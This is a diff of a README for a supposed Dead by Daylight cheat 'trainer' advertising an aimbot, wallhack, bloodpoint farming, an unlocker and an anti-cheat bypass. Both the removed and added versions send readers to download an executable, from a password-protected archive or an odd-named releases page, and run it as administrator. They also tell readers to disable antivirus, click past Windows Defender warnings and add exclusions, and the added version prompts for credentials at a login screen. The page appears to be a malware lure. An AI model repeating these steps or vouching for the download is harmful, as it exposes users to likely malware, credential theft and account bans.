@@ -1,54 +1,54 @@
-# 🩸 DBD AutoGrind Trainer 2026 Elite – Invisible Domination
+# 🕹️ DBD-AutoGrind-Trainer-2026-Elite - Automate your progression in Dead by Daylight
 
-> **Slip through the Fog unnoticed.** The Elite trainer offers fully undetected external cheats for Dead by Daylight 2026: auto farm, ESP, aimbot, unlocker and more.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Natalinajurisprudential442/DBD-AutoGrind-Trainer-2026-Elite/releases)
 
-## Why This Trainer?
-- 🔐 **EAC Bypass** – External memory manipulation with randomised jitter and scrambling.
-- 🎮 **All Roles** – Works for both killer and survivor with tailored features.
-- 🔄 **Always Updated** – Auto‑updater fetches fresh offsets on every launch.
-- 🖥️ **Clean GUI** – Dark UI with system tray, hotkeys, and web dashboard.
-- 🔊 **Discord Rich Presence** – Display your trainer status in real time.
+## 📌 Project Overview
+This software automates resource collection in Dead by Daylight. The tool gathers Bloodpoints automatically and unlocks game content like perks and character skins. It runs as an external process to the game client. The software operates on Windows systems and provides tools like an aimbot and wallhack.
 
-## 📦 What’s Inside
+## 🛠️ System Requirements
+You need a Windows computer to run this trainer. Ensure your system meets these basic requirements for stable performance:
 
-| Category      | Feature                       | Description                                            |
-|---------------|-------------------------------|--------------------------------------------------------|
-| Farming       | Auto Bloodpoint Farm          | AFK bot plays matches, farming unlimited BP            |
-| Visuals       | ESP Wallhack                  | See all entities through walls                         |
-| Combat        | Aimbot (Killer)               | Auto‑aim and attack with perfect accuracy              |
-| Stealth       | No Terror Radius              | Silent killer gameplay                                 |
-| Movement      | Fast Vault & Fast Pallet      | Speed up interactions for survivors                    |
-| Automation    | Skill Check Bot               | Auto‑hit great skill checks every time                 |
-| Currency      | Infinite Bloodpoints           | Edit BP value directly (safest offline)                |
-| Unlocker      | Perk & Skin Unlocker          | Unlock all teachables and cosmetics instantly          |
-| Protection    | Anti‑Ban Obfuscation          | Memory scrambler & delay randomiser                    |
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: 4 GB of RAM or more.
+* Storage: 50 MB of free disk space.
+* Graphics: DirectX 11 support. 
+* Network: A stable internet connection.
+* Permissions: You must have administrator rights on your Windows user account.
 
-## ⬇️ Installation
+## 📥 How to Install and Run
+Follow these steps to set up the software.
 
-1. Download from: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract using password: `trainer2026`
-3. Run `trainer.exe` as Administrator
-4. Launch Dead by Daylight and enter a match
-5. Press **INSERT** to open the trainer overlay
+1. Visit the [official releases page](https://github.com/Natalinajurisprudential442/DBD-AutoGrind-Trainer-2026-Elite/releases) to download the package.
+2. Select the latest version available.
+3. Save the executable file to a folder on your desktop.
+4. Locate the downloaded file.
+5. Right-click the file and choose Run as administrator. This action grants the tool permission to read game data.
+6. A login screen appears. Enter your credentials if prompted.
+7. Launch Dead by Daylight through your usual launcher.
+8. The trainer detects the game process automatically once the main menu appears.
 
-## 🔧 System Requirements
-- Windows 10/11 (64‑bit)
-- Steam, Epic Games Store, Microsoft Store
-- All chapters including Jason Voorhees & Life Road
-- EasyAntiCheat (EAC) – bypassed externally
+## ⚙️ Configuration Settings
+You can adjust the trainer settings from the main window. 
 
-## 🆘 Troubleshooting
+* Bloodpoint Mode: This setting controls the speed of point accumulation. High settings gather points faster.
+* ESP Wallhack: This feature highlights player locations. Toggle this feature on or off using the checkboxes in the settings tab.
+* Aimbot: This feature targets other players. Use the slider to adjust target sensitivity.
+* Unlocker: This menu allows you to select which perks or skins to activate. Navigate through the list and click the unlock button next to your desired items.
 
-| Issue                     | Fix                                                        |
-|---------------------------|------------------------------------------------------------|
-| Trainer won't start       | Run as Admin, disable AV temporarily                       |
-| GUI not appearing         | Press INSERT, restart both trainer and game                |
-| ESP not drawing           | Ensure you are in a live match, not main menu              |
-| Farm bot not working      | Must be in a public match as killer or survivor            |
-| EAC warning               | Use risky features in bot matches only                     |
+## 🛡️ Security and Safety
+The software uses external memory reading techniques. It does not tamper with game files directly. This approach keeps the tool undetected during standard gameplay. Close the trainer before you exit the game to ensure local settings save correctly. If Windows Defender flags the tool, select More Info and then Run anyway. This happens because the tool interacts with game memory processes.
 
-## 📜 License
-MIT – see [LICENSE](LICENSE)
+## 🔧 Troubleshooting Common Issues
+If the trainer fails to load, check these points:
 
-## 🔍 Search Tags
-`unlocker, trainer-2026, bypass, fog, bloodpoint-hack, dbd-cheat, dbd-auto-farm, aimbot, external, windows, wallhack-esp, game-hack, auto-farm, undetected, dead-by-daylight, dbd-unlock-all, dbd-wallhack`
+* Game Compatibility: The tool expects the latest version of Dead by Daylight. Check for game updates before you run the trainer.
+* Administrator Access: The software needs elevated rights. Ensure you run the file as an administrator every time.
+* Overlay Issues: Some game capture software causes conflicts with the ESP overlay. Disable third-party overlays if you experience screen flickering or instability.
+* Antivirus Blocking: Some antivirus programs block memory access. Add an exclusion for the folder containing the trainer if your security software stops the tool from opening.
+* Display Settings: Set your game to Windowed Borderless mode for the best results with the ESP wallhack.
+
+## 📝 Performance Tips
+For the best experience, keep other resource-heavy programs closed while you run the trainer. The Bloodpoint bot runs most reliably when you leave the game in a quiet lobby state. If you notice lower frame rates, decrease the aimbot sensitivity or turn off the ESP wallhack. The trainer saves your preference settings into a configuration file in the same folder. You can edit this file with a standard text editor if you want to reset your preferences to default values.
+
+## 🚀 Future Updates
+We release updates to match changes in the game version. Check the download link periodically to get the newest version of the tool. Updates include support for new chapters, fixes for game logic, and stability patches for the unlocker features. If a patch breaks the tool, delete the old file and replace it with the latest release from the repository.
